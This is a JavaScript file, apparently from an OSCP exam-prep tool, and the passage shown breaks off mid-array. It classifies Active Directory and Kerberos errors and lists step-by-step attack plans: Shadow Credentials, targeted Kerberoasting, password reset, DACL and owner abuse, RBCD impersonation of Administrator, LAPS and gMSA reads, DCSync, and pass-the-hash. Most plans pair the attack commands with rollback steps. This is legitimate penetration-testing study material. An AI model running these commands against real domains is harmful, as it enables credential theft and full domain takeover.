
/* ===== V19 Windows Strategy integration ===== */
const AD_FAILURE_RULES=[
 {id:'pwned',severity:'good',lane:'AUTHENTICATED + ADMIN',re:/Pwn3d!/i,title:'Protocol-specific code execution is available',meaning:'NetExec marked this account administrative for the tested protocol/host.',next:'Record the exact account, host and protocol; use the matching remote client and immediately baseline the new token with whoami /all.'},
 {id:'preauth-required',severity:'good',lane:'EXPECTED KERBEROS SIGNAL',re:/KDC_ERR_PREAUTH_REQUIRED|KDC_ERR_PREAUTH_REQUIRED/i,title:'The KDC is asking for normal pre-authentication',meaning:'This response commonly confirms that the principal exists; it is not by itself an AS-REP-roastable finding or a bad password.',next:'Continue with the authenticated request. Only treat a user as AS-REP roastable when the KDC returns material without pre-authentication.'},
 {id:'locked',severity:'bad',lane:'ACCOUNT STATE',re:/STATUS_ACCOUNT_LOCKED_OUT|NT_STATUS_ACCOUNT_LOCKED_OUT|account\s+(?:is\s+)?locked/i,title:'Account locked',meaning:'More retries can worsen the incident and hide whether the secret was valid.',next:'Stop all attempts for this principal, record the tool/host/time, check whether another process is retrying, and follow the exam environment recovery path.'},
 {id:'disabled',severity:'bad',lane:'ACCOUNT STATE',re:/STATUS_ACCOUNT_DISABLED|NT_STATUS_ACCOUNT_DISABLED|KDC_ERR_CLIENT_REVOKED|account\s+(?:is\s+)?disabled/i,title:'Account disabled or revoked',meaning:'The identity is not currently permitted to authenticate; changing protocols will not fix its state.',next:'Verify the exact username/domain once, stop retries, and pursue another issued or discovered identity.'},
 {id:'password-state',severity:'warn',lane:'ACCOUNT STATE',re:/STATUS_PASSWORD_EXPIRED|STATUS_PASSWORD_MUST_CHANGE|KDC_ERR_KEY_EXPIRED|password\s+(?:has\s+)?expired|must\s+change\s+(?:the\s+)?password/i,title:'Password expired or must change',meaning:'The supplied secret may be correct, but account policy blocks an ordinary logon.',next:'Record this as valid-but-restricted. Open the mutation-safe recovery path before changing tools or credentials.',ref:'ref-9-4b-password-state-recovery'},
 {id:'clock',severity:'warn',lane:'TIME / KERBEROS',re:/KRB_AP_ERR_SKEW|clock\s+skew|KDC_ERR_NEVER_VALID/i,title:'Attacker and domain time differ',meaning:'Kerberos can reject a correct credential when time is outside tolerance.',next:'Confirm the correct DC and UTC offset, query its time, sync Kali only if needed, then retry the same command unchanged.',ref:'ref-9-4a-rubeus-material-router'},
 {id:'ticket-key',severity:'warn',lane:'SPN / TICKET CONTEXT',re:/KRB_AP_ERR_MODIFIED|message\s+stream\s+modified/i,title:'The service could not decrypt the ticket',meaning:'Common causes are the wrong hostname/SPN, duplicate SPN, stale ticket, or reaching a different host than the ticket names.',next:'Use the target FQDN, verify DNS/IP identity, purge or replace stale ticket context, and request a fresh ticket before changing the credential.',ref:'ref-9-4a-rubeus-material-router'},
 {id:'service-principal',severity:'warn',lane:'SPN / TARGET NAME',re:/KDC_ERR_S_PRINCIPAL_UNKNOWN|server\s+not\s+found\s+in\s+kerberos\s+database/i,title:'Service principal not found',meaning:'The KDC does not recognize the requested service/hostname combination.',next:'Verify FQDN, DNS, SPN/service name and the actual target host. Do not replace a known-valid password first.',ref:'ref-9-4a-rubeus-material-router'},
 {id:'client-principal',severity:'warn',lane:'USER / DOMAIN FORMAT',re:/KDC_ERR_C_PRINCIPAL_UNKNOWN|client\s+not\s+found\s+in\s+kerberos\s+database|STATUS_NO_SUCH_USER|NT_STATUS_NO_SUCH_USER/i,title:'Client principal not found',meaning:'The user/domain/realm spelling or account type is wrong.',next:'Confirm sAMAccountName vs UPN, the DNS domain/realm, and whether the credential is local or domain. Then make one corrected attempt.'},
 {id:'realm-dns',severity:'warn',lane:'DNS / REALM',re:/KDC_ERR_WRONG_REALM|Cannot\s+find\s+KDC|cannot\s+contact\s+any\s+KDC|Name\s+or\s+service\s+not\s+known|Temporary\s+failure\s+in\s+name\s+resolution|Could\s+not\s+resolve|NXDOMAIN/i,title:'Domain, realm or name resolution is wrong',meaning:'The client cannot reliably map the domain/service to the intended controller.',next:'Verify /etc/hosts or DNS server, domain spelling, DC FQDN, SRV records and -dc-ip/-ns arguments before touching the secret.'},
 {id:'transport',severity:'warn',lane:'ROUTE / PORT / SERVICE',re:/No\s+route\s+to\s+host|Network\s+is\s+unreachable|Connection\s+refused|Connection\s+timed\s+out|timed\s+out\s+during\s+connect|Host\s+is\s+down|STATUS_NETWORK_UNREACHABLE/i,title:'Transport failed before authentication',meaning:'No credential conclusion is justified because the client did not reach the expected service.',next:'Prove reachability from the current host, confirm route/tunnel/session, scan the exact port, and verify connection direction.'},
 {id:'syntax',severity:'warn',lane:'TOOL / VERSION / DEPENDENCY',re:/unrecognized\s+arguments?|invalid\s+choice|unknown\s+option|ModuleNotFoundError|No\s+module\s+named|ImportError|command\s+not\s+found|not\s+recognized\s+as\s+an\s+internal\s+or\s+external\s+command|usage:\s/i,title:'Local command or tool failure',meaning:'The target has not disproved the path; the installed syntax, wrapper, dependency or binary name differs.',next:'Run the installed -h/--help and version, verify Kali wrapper names and collector generation, then retry one corrected command.'},
 {id:'share',severity:'warn',lane:'SMB OBJECT',re:/STATUS_BAD_NETWORK_NAME|NT_STATUS_BAD_NETWORK_NAME|BAD_NETWORK_NAME/i,title:'Share name does not exist',meaning:'SMB transport/authentication may be fine; the requested share is wrong or unavailable.',next:'List shares first, preserve exact spelling, then connect to a returned share. Do not discard the credential.'},
 {id:'authorization',severity:'warn',lane:'AUTHORIZATION / LOGON RIGHT',re:/STATUS_ACCESS_DENIED|NT_STATUS_ACCESS_DENIED|STATUS_LOGON_TYPE_NOT_GRANTED|WinRMAuthorizationError|Access\s+is\s+denied|HTTP\s+401|HTTP\s+403|Unauthorized/i,title:'Reached the service but access is not authorized',meaning:'Authentication and authorization are separate. The account may be valid but lack this share, logon type, WinRM group/policy or requested action.',next:'Validate the credential once with SMB/LDAP or a native client, inspect groups/rights and the exact resource, then try only another exposed protocol justified by those rights.'},
 {id:'credentials',severity:'bad',lane:'AUTHENTICATION',re:/STATUS_LOGON_FAILURE|NT_STATUS_LOGON_FAILURE|KDC_ERR_PREAUTH_FAILED|invalid\s+credentials|Logon\s+failure|authentication\s+failed|NT_STATUS_WRONG_PASSWORD/i,title:'Authentication failed',meaning:'This endpoint rejected the presented identity/secret, but formatting, local-vs-domain context and account state still matter.',next:'Stop repeated retries. Check smart quotes, username format, domain/local mode and password provenance; then make at most one corrected validation attempt.'},
 {id:'auth-only',severity:'good',lane:'AUTHENTICATED — RIGHTS UNKNOWN',re:/\[\+\]/,title:'Authentication appears successful',meaning:'The credential was accepted by the tested protocol. Without Pwn3d! or a successful native action, administrative/code-execution rights are not proven.',next:'Record the credential/host/protocol, enumerate permitted shares or LDAP data, and test remote access only where ports and rights justify it.'}
];
function classifyAdFailure(value){
 const raw=String(value||'').trim();
 if(!raw)return{id:'empty',severity:'',lane:'WAITING',title:'No output supplied',meaning:'Paste the exact error or one result line.',next:'Keep the original capitalization/status code and include the tool name when possible.'};
 const formatting=unicodeProblems(raw);if(formatting.length)return{id:'unicode',severity:'bad',lane:'COMMAND TEXT',title:'Risky Unicode formatting detected',meaning:`Found ${formatting.join(', ')}. The command may look correct while the shell/tool receives different characters.`,next:'Use the sanitized copy, re-type secrets when necessary, and retry the identical hypothesis before debugging the target.'};
 const clean=sanitizeUnicode(raw);for(const rule of AD_FAILURE_RULES){rule.re.lastIndex=0;if(rule.re.test(clean))return rule}
 return{id:'unknown',severity:'warn',lane:'UNCLASSIFIED',title:'No known signature matched',meaning:'Do not turn an unfamiliar error into a credential or exploit conclusion.',next:'Preserve the full command/output, read the first/root error, run local help/version, and separately verify DNS, time, route, authentication and authorization.'};
}
function renderAdFailureDecoder(){const box=$('#adFailureResult');if(!box)return;const r=classifyAdFailure($('#adFailureInput')?.value||'');box.className='adDecoderResult '+(r.severity||'');const jump=r.ref?'<button class="btn" type="button" data-ad-ref="'+esc(r.ref)+'">Open recovery reference →</button>':'';box.innerHTML='<span class="adLane">'+esc(r.lane)+'</span><h3>'+esc(r.title)+'</h3><p><b>Meaning:</b> '+esc(r.meaning)+'</p><p><b>Next:</b> '+esc(r.next)+'</p>'+jump;const b=box.querySelector('[data-ad-ref]');if(b)b.addEventListener('click',()=>openRef(r.ref))}

const OSCP_RELEASE_VERSION='V19';
const AD_FAST_STEPS=['context','auth','visibility','graph'];
const AD_EDGE_PLANS=[
 {id:'generic-user',label:'GenericAll / GenericWrite → user',target:'User',risk:'medium',summary:'Full/generic write over a user is a menu of possible paths, not a command. Prefer the least disruptive reversible branch whose prerequisites you can prove.',prereq:`Confirm the edge source is the credential/session you currently control.
Confirm EDGE_TARGET is a user and inspect its attributes.
For Shadow Credentials: Windows Server 2016+ schema/DC and working PKINIT/CA.
For targeted Kerberoast: writable servicePrincipalName and a crackable target password are still required.`,read:`bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" get object "$EDGE_TARGET" --attr sAMAccountName,userAccountControl,servicePrincipalName,msDS-KeyCredentialLink
certipy shadow list -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" -account "$EDGE_TARGET" -dc-ip "$DC_IP"`,action:`# Reversible first choice when PKINIT prerequisites are proven:
certipy shadow auto -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" -account "$EDGE_TARGET" -dc-ip "$DC_IP"
# If that prerequisite fails, stop and classify it; use the WriteSPN plan only when the exact edge supports it.`,verify:`# Save Certipy's returned ccache/hash, then validate only against justified services.
klist
nxc smb "$DC_IP" -u "$EDGE_TARGET" -H "$NT_HASH" -d "$DOMAIN"
# Re-read the target attribute and compare with the pre-state.`,rollback:`# shadow auto removes the key it added. Re-list and compare with the saved pre-state.
certipy shadow list -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" -account "$EDGE_TARGET" -dc-ip "$DC_IP"
# If auto cleanup failed, remove ONLY the recorded device ID; never clear all keys.
certipy shadow remove -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" -account "$EDGE_TARGET" -device-id "$DEVICE_ID" -dc-ip "$DC_IP"`,caveat:'Do not jump straight to password reset. A reset has no clean rollback unless the original password is known and may break a service account.'},
 {id:'write-spn',label:'WriteSPN → user',target:'User',risk:'medium',summary:'Temporarily add an SPN, request one TGS, and remove the exact temporary SPN. The result still has to be cracked offline.',prereq:`Confirm WriteSPN/GenericWrite/GenericAll from the controlled source to this exact user.
Verify DNS/time/Kerberos and that EDGE_TARGET is only the sAMAccountName.
Record existing servicePrincipalName values before any write.`,read:`bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" get object "$EDGE_TARGET" --attr servicePrincipalName
targetedKerberoast.py -h | sed -n '1,120p'`,action:`targetedKerberoast.py -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" --dc-ip "$DC_IP" --request-user "$EDGE_TARGET" --only-abuse -o targeted-kerberoast.txt`,verify:`test -s targeted-kerberoast.txt && sed -n '1p' targeted-kerberoast.txt
hashcat --identify targeted-kerberoast.txt
# Re-read servicePrincipalName and compare it with the saved pre-state.`,rollback:`# targetedKerberoast removes the temporary SPN it adds.
bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" get object "$EDGE_TARGET" --attr servicePrincipalName
# If values differ, restore only the exact temporary value after consulting local tool help.`,caveat:'A returned TGS is evidence, not a password. Do not overwrite or clear pre-existing SPNs.'},
 {id:'add-member',label:'AddMember / GenericAll → group',target:'Group',risk:'medium',summary:'Add only the controlled principal to the exact group, obtain a fresh token/session, prove the new access, then remove that one membership.',prereq:`Confirm the destination is the intended group, not a similarly named object.
Confirm source principal has AddMember/GenericWrite/GenericAll on that group.
Save the current member list and plan a fresh logon/token after the change.`,read:`bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" get object "$EDGE_TARGET" --attr member`,action:`bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" add groupMember "$EDGE_TARGET" "$CONTROLLED_PRINCIPAL"`,verify:`bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" get membership "$CONTROLLED_PRINCIPAL"
# Start a fresh logon/session before checking whoami /groups; an old token will not gain the group.`,rollback:`bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" remove groupMember "$EDGE_TARGET" "$CONTROLLED_PRINCIPAL"
# Re-read the member list and preserve proof of restoration.`,caveat:'Group membership changes directory state and old access tokens do not refresh automatically.'},
 {id:'force-password',label:'ForceChangePassword → user',target:'User',risk:'high',summary:'Reset the target password only when no safer proven branch exists and the resulting identity is necessary.',prereq:`Confirm the exact ForceChangePassword edge and target user.
Check whether the user is a service/task/application identity.
Define NEW_PASS locally and record that the old password is unknown.
Treat this as disruptive and potentially irreversible.`,read:`bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" get object "$EDGE_TARGET" --attr sAMAccountName,userAccountControl,pwdLastSet,servicePrincipalName`,action:`export NEW_PASS='replace-with-compliant-one-time-password'
bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" set password "$EDGE_TARGET" "$NEW_PASS"`,verify:`nxc smb "$DC_IP" -u "$EDGE_TARGET" -p "$NEW_PASS" -d "$DOMAIN"
nxc ldap "$DC_IP" -u "$EDGE_TARGET" -p "$NEW_PASS" -d "$DOMAIN"`,rollback:`# NO SAFE GENERIC ROLLBACK when the original password is unknown.
# Do not invent an old value or perform a second reset merely for cleanup.
# Record the exact change, time, target and operational impact.`,caveat:'High-risk mutation: a password reset can break services, scheduled tasks, applications and the candidate environment.'},
 {id:'write-dacl',label:'WriteDacl → object',target:'Any AD object',risk:'high',summary:'Back up the complete DACL, grant only one minimum required right to one controlled principal, validate, then restore the saved descriptor.',prereq:`Confirm WriteDacl applies to the exact target object and source principal.
Choose one supported minimum right only: WriteMembers, ResetPassword, DCSync or a justified custom GUID.
Run impacket-dacledit -h and save the generated backup filename.`,read:`impacket-dacledit -action read -principal "$CONTROLLED_PRINCIPAL" -target "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER"
impacket-dacledit -action backup -target "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER"`,action:`export MINIMUM_RIGHT='WriteMembers'
impacket-dacledit -action write -rights "$MINIMUM_RIGHT" -principal "$CONTROLLED_PRINCIPAL" -target "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER"`,verify:`impacket-dacledit -action read -principal "$CONTROLLED_PRINCIPAL" -target "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER"
# Then use the separate plan for the resulting right; do not assume it worked.`,rollback:`export DACL_BACKUP='dacledit-YYYYMMDD-HHMMSS.bak'
impacket-dacledit -action restore -file "$DACL_BACKUP" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER"
# Re-read and compare with the original output.`,caveat:'Restoring from the wrong file can overwrite legitimate changes. Tie the backup filename to the exact target and timestamp.'},
 {id:'write-owner',label:'WriteOwner → object',target:'Any AD object',risk:'high',summary:'Ownership enables DACL modification; it does not by itself grant the desired downstream action. Record the original owner before changing it.',prereq:`Confirm the exact WriteOwner edge and object.
Read and record ORIGINAL_OWNER exactly.
Plan the minimum DACL grant and both restoration steps before writing.`,read:`impacket-owneredit -action read -target "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER"
# Copy the reported owner into ORIGINAL_OWNER before continuing.`,action:`impacket-owneredit -action write -new-owner "$CONTROLLED_PRINCIPAL" -target "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER"
# Now follow the WriteDacl plan; ownership is only the bridge.`,verify:`impacket-owneredit -action read -target "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER"
impacket-dacledit -action read -principal "$CONTROLLED_PRINCIPAL" -target "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER"`,rollback:`# Restore the backed-up DACL first, then restore the exact original owner.
impacket-owneredit -action write -new-owner "$ORIGINAL_OWNER" -target "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER"
impacket-owneredit -action read -target "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER"`,caveat:'owneredit has read/write actions, not an automatic restore action. A recorded original owner is mandatory.'},
 {id:'shadow',label:'AddKeyCredentialLink → user/computer',target:'User or computer',risk:'medium',summary:'Use an exact-device Shadow Credentials workflow only when schema/DC and PKINIT prerequisites are proven.',prereq:`Confirm EDGE_TARGET is the destination of AddKeyCredentialLink.
DC/schema functionality must support msDS-KeyCredentialLink (2016+).
PKINIT needs a suitable certificate authority path.
Save the existing key list before modification.`,read:`bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" get object '' --attr domainControllerFunctionality
certipy shadow list -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" -account "$EDGE_TARGET" -dc-ip "$DC_IP"`,action:`certipy shadow auto -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" -account "$EDGE_TARGET" -dc-ip "$DC_IP"`,verify:`# Save the returned credential material and verify the auto-cleanup result.
certipy shadow list -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" -account "$EDGE_TARGET" -dc-ip "$DC_IP"
klist`,rollback:`# Auto should remove only its inserted key. If it did not, remove the recorded device ID only:
certipy shadow remove -u "$AUTH_USER@$DOMAIN" -p "$AUTH_PASS" -account "$EDGE_TARGET" -device-id "$DEVICE_ID" -dc-ip "$DC_IP"
# Never use clear against a target with pre-existing keys.`,caveat:'PKINIT failure does not disprove the ACL edge. Diagnose schema, CA, DNS, time and tool version separately.'},
 {id:'rbcd',label:'AllowedToAct / AddAllowedToAct → computer',target:'Computer',risk:'high',summary:'RBCD requires a controlled service account with an SPN, an exact target computer, a compatible impersonated user and a service ticket matching the target FQDN/service.',prereq:`Confirm EDGE_TARGET is the target computer account and CONTROLLED_COMPUTER ends with $.
The controlled computer/service account needs an SPN and known password/hash.
Target must support RBCD (Windows Server 2012+).
Do not impersonate Protected Users or accounts restricted from delegation.`,read:`impacket-rbcd -action read -delegate-to "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER"
bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" get object "$CONTROLLED_COMPUTER" --attr servicePrincipalName`,action:`impacket-rbcd -action write -delegate-from "$CONTROLLED_COMPUTER" -delegate-to "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER"
impacket-getST -spn "cifs/$TARGET_HOST" -impersonate Administrator -dc-ip "$DC_IP" "$DOMAIN/$CONTROLLED_COMPUTER"`,verify:`export KRB5CCNAME='/absolute/path/printed-by-getST.ccache'
klist
impacket-smbclient -k -no-pass "$DOMAIN/Administrator@$TARGET_HOST"`,rollback:`impacket-rbcd -action remove -delegate-from "$CONTROLLED_COMPUTER" -delegate-to "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER"
impacket-rbcd -action read -delegate-to "$EDGE_TARGET" -dc-ip "$DC_IP" "$DOMAIN/$AUTH_USER"
# Never use flush when other legitimate delegates exist.`,caveat:'The ticket service and FQDN must match the service you actually use. A cifs ticket does not prove WinRM or another SPN.'},
 {id:'admin-to',label:'AdminTo → computer',target:'Computer',risk:'low',summary:'AdminTo proves local administrative control in the graph; execution still depends on reachability, service state, policy and the token produced by the chosen protocol.',prereq:`Confirm the source identity is currently usable and the edge is fresh.
Resolve TARGET_HOST to the intended IP.
Check only relevant remote-management ports and account format.`,read:`getent hosts "$TARGET_HOST"
nmap -Pn -n -p 135,139,445,3389,5985,5986 "$TARGET_HOST" -oA "access-$TARGET_HOST"
nxc smb "$TARGET_HOST" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"`,action:`# Choose ONE exposed/authorized protocol; do not run all three blindly.
evil-winrm -i "$TARGET_HOST" -u "$AUTH_USER" -p "$AUTH_PASS"
impacket-wmiexec "$DOMAIN/$AUTH_USER@$TARGET_HOST"
impacket-psexec "$DOMAIN/$AUTH_USER@$TARGET_HOST"`,verify:`whoami /all
hostname
ipconfig
# Record the exact protocol because it determines token/session behavior.`,rollback:`exit
# No directory mutation. Close the session and remove only temporary payloads you created.`,caveat:'SMB authentication success is not the same as remote code execution. Pwn3d! is protocol/host-specific evidence, not a universal guarantee.'},
 {id:'psremote',label:'CanPSRemote → computer',target:'Computer',risk:'low',summary:'The edge indicates PowerShell remoting rights. It does not guarantee an elevated token or local-administrator access.',prereq:`Confirm TCP 5985/5986 reachability and TARGET_HOST identity.
Validate the credential with WinRM once.
Expect constrained endpoints/JEA or a non-admin token to change capabilities.`,read:`nmap -Pn -n -p 5985,5986 "$TARGET_HOST" -oA "winrm-$TARGET_HOST"
nxc winrm "$TARGET_HOST" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"`,action:`evil-winrm -i "$TARGET_HOST" -u "$AUTH_USER" -p "$AUTH_PASS"`,verify:`whoami /all
hostname
$ExecutionContext.SessionState.LanguageMode`,rollback:`exit
# No AD mutation. Remove only files you explicitly transferred.`,caveat:'A working WinRM shell may be low privilege. Re-run the Windows baseline in that exact session.'},
 {id:'rdp',label:'CanRDP → computer',target:'Computer',risk:'low',summary:'CanRDP indicates the relevant logon right/group relationship, but Network Level Authentication, reachability and local policy can still block a session.',prereq:`Confirm TCP 3389 and TARGET_HOST identity.
Validate whether the credential is domain or local.
Do not infer administrative rights from successful RDP logon.`,read:`nmap -Pn -n -p 3389 "$TARGET_HOST" -oA "rdp-$TARGET_HOST"
nxc rdp "$TARGET_HOST" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN"`,action:`# Kali may expose xfreerdp3 or xfreerdp; confirm local -h first.
xfreerdp3 /v:"$TARGET_HOST" /u:"$AUTH_USER" /p:"$AUTH_PASS" /d:"$DOMAIN" /cert:tofu`,verify:`whoami /all
hostname
ipconfig`,rollback:`logoff
# Close the client; no directory mutation is performed.`,caveat:'A desktop session creates a different logon/token/profile context. Re-enumerate instead of assuming parity with SMB or WinRM.'},
 {id:'laps',label:'ReadLAPSPassword → computer',target:'Computer',risk:'medium',summary:'Read the managed local administrator credential only for the exact computer object, then use it as a local—not domain—credential.',prereq:`Confirm ReadLAPSPassword applies to EDGE_TARGET and map that computer object to TARGET_HOST.
Use LDAPS only when the environment requires it.
Treat the result as a secret and do not spray it across unrelated hosts.`,read:`impacket-GetLAPSPassword "$DOMAIN/$AUTH_USER" -dc-ip "$DC_IP" -computer "$EDGE_TARGET"
# If the DC enforces the newer path, consult -h and retry with -ldaps.`,action:`export LAPS_USER='Administrator'
export LAPS_PASS='paste-exact-returned-secret'
nxc smb "$TARGET_HOST" -u "$LAPS_USER" -p "$LAPS_PASS" --local-auth`,verify:`# Pwn3d! may justify a matching SMB execution method; [+] proves auth only.
nxc smb "$TARGET_HOST" -u "$LAPS_USER" -p "$LAPS_PASS" --local-auth --shares`,rollback:`unset LAPS_PASS
# Reading LAPS does not mutate AD. Remove plaintext copies when no longer needed while preserving required exam evidence securely.`,caveat:'LAPS credentials are per computer and rotate. A password from one host should not be assumed valid on another.'},
 {id:'gmsa',label:'ReadGMSAPassword → gMSA',target:'gMSA',risk:'medium',summary:'Retrieve the gMSA material through LDAP, identify the exact account and test only services justified by its SPNs or graph path.',prereq:`Confirm ReadGMSAPassword applies to the current principal and exact gMSA.
Use the account name with its trailing $.
Record its SPNs and intended host/service before using the returned hash.`,read:`bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" get object "$EDGE_TARGET" --attr sAMAccountName,servicePrincipalName,msDS-ManagedPassword`,action:`nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" -d "$DOMAIN" --gmsa`,verify:`export GMSA_HASH='paste-exact-returned-ntlm'
nxc ldap "$DC_IP" -u "$EDGE_TARGET" -H "$GMSA_HASH" -d "$DOMAIN"
# Then test only the host/service supported by the SPN or graph.`,rollback:`unset GMSA_HASH
# Read-only against AD; protect or remove plaintext/hash copies according to your evidence plan.`,caveat:'Possession of the hash proves an identity, not where it has useful access. SPNs and graph relationships decide the next service.'},
 {id:'dcsync',label:'DCSync → domain',target:'Domain',risk:'medium',summary:'DCSync is composed from replication rights. Dump only the account needed for the proven next step before considering broader collection.',prereq:`Confirm BloodHound built DCSync from both GetChanges and GetChangesAll on the exact domain.
Confirm current source credential and DC identity.
Set DCSYNC_USER to one justified account first.`,read:`# Inspect the DCSync edge composition/source in BloodHound.
bloodyAD -H "$DC" -i "$DC_IP" -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" get object "$DOMAIN" --attr distinguishedName`,action:`export DCSYNC_USER='Administrator'
impacket-secretsdump -just-dc-user "$DCSYNC_USER" -dc-ip "$DC_IP" -outputfile "dcsync-$DCSYNC_USER" "$DOMAIN/$AUTH_USER@$DC"`,verify:`ls -l "dcsync-$DCSYNC_USER"*
# Validate only the required returned material against one justified service.`,rollback:`unset DCSYNC_USER
# DCSync is read-only against AD. Secure the output; do not delete evidence needed for the report.`,caveat:'Credential material is highly sensitive. Targeted collection reduces error and clutter; replication rights and current authentication still must be real.'}
];

const CREDENTIAL_ROUTE_PLANS=[
 {id:'domain-password',label:'Domain password',kind:'DOMAIN',prereq:'Confirm DOMAIN, USER, source, lockout risk, target IP/FQDN, DNS/time and an exposed SMB/LDAP service.',proof:`nxc smb "$IP" -u "$USER" -p "$PASS" -d "$DOMAIN"
smbclient -L "//$IP/" -U "$DOMAIN/$USER"`,next:`nxc smb "$IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --shares
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN"`,success:'A [+] or successful native listing proves authentication/read access only. Pwn3d! or a successful authorized action is separate evidence.',fallback:'Fix domain/user format, DNS and time; make one native SMB/LDAP request. Do not turn one protocol denial into “bad password.”',close:'Record host + protocol + account scope; unset PASS when finished.'},
 {id:'local-password',label:'Local/SAM password',kind:'ONE HOST',prereq:'Map the account to one exact Windows host. Confirm lockout risk and do not supply a domain.',proof:`nxc smb "$IP" -u "$LOCAL_USER" -p "$PASS" --local-auth`,next:`nxc smb "$IP" -u "$LOCAL_USER" -p "$PASS" --local-auth --shares
# Only when WinRM is exposed and the account is authorized:
evil-winrm -i "$IP" -u "$LOCAL_USER" -p "$PASS"`,success:'Successful local authentication applies to this host. It neither proves domain identity nor remote-administrator rights.',fallback:'Confirm the hostname/SAM account and try the native client for the same host once. Stop on lockout/account-state errors.',close:'Do not fan a local password across unrelated hosts without evidence of reuse; unset PASS.'},
 {id:'nt-hash',label:'NTLM / NT hash',kind:'LOCAL OR DOMAIN',prereq:'Identify whether the principal is local or domain and preserve the NT half exactly; confirm the selected protocol supports pass-the-hash.',proof:`# Domain account:
nxc smb "$IP" -u "$USER" -H "$NTHASH" -d "$DOMAIN"
# Local account instead:
nxc smb "$IP" -u "$USER" -H "$NTHASH" --local-auth`,next:`nxc smb "$IP" -u "$USER" -H "$NTHASH" -d "$DOMAIN" --shares
# If 5985/5986 is exposed and authorization is expected:
evil-winrm -i "$IP" -u "$USER" -H "$NTHASH"`,success:'Accepted NTLM proves this identity on this service. It does not imply WinRM/RDP access or administrative execution.',fallback:'Check LM:NT vs NT-only format, local/domain mode and NTLM policy. Try one exact Impacket/native protocol client.',close:'Protect the hash as a secret, record the validated host/protocol, then unset NTHASH.'},
 {id:'ccache',label:'Kerberos ccache/kirbi',kind:'TICKET',prereq:'Convert kirbi if needed. Confirm principal, realm, ticket times/service, DNS, domain time and target FQDN; Kerberos is name-sensitive.',proof:`export KRB5CCNAME='/absolute/path/user.ccache'
klist
nxc smb "$HOST_FQDN" --use-kcache`,next:`impacket-smbclient -k -no-pass "$DOMAIN/$USER@$HOST_FQDN"
# Administrative path only when separately proven:
impacket-wmiexec -k -no-pass "$DOMAIN/$USER@$HOST_FQDN"`,success:'A cache can hold only a TGT or a service-limited ticket. klist + one matching FQDN/service request defines what it can actually do.',fallback:'Fix FQDN/SPN, realm, DNS, time or ticket expiry before changing tools. Use -k -no-pass with the matching Impacket client.',close:'Do not rename away ticket identity context. Protect the cache, then unset KRB5CCNAME.'},
 {id:'certificate',label:'PFX / PEM certificate',kind:'CERTIFICATE',prereq:'Confirm certificate identity/UPN, matching private key, optional PFX password, target FQDN/IP, DNS and time.',proof:`# PFX:
nxc smb "$HOST_FQDN" -u "$USER" --pfx-cert "$PFX" --pfx-pass "$PFX_PASS"
# PEM pair instead:
nxc smb "$HOST_FQDN" -u "$USER" --pem-cert "$CERT_PEM" --pem-key "$KEY_PEM"`,next:`# Independent PKINIT client fallback / ticket + hash output:
certipy auth -pfx "$PFX" -dc-ip "$DC_IP"
klist`,success:'Successful certificate authentication establishes the mapped AD identity and may create a ccache. It does not itself prove rights on a target host.',fallback:'Inspect certificate subject/SAN/EKU, key match, account mapping, CA/PKINIT, DNS and time; then run installed -h for exact version syntax.',close:'Protect the PFX/key and generated cache/hash. Unset certificate/password variables when done.'},
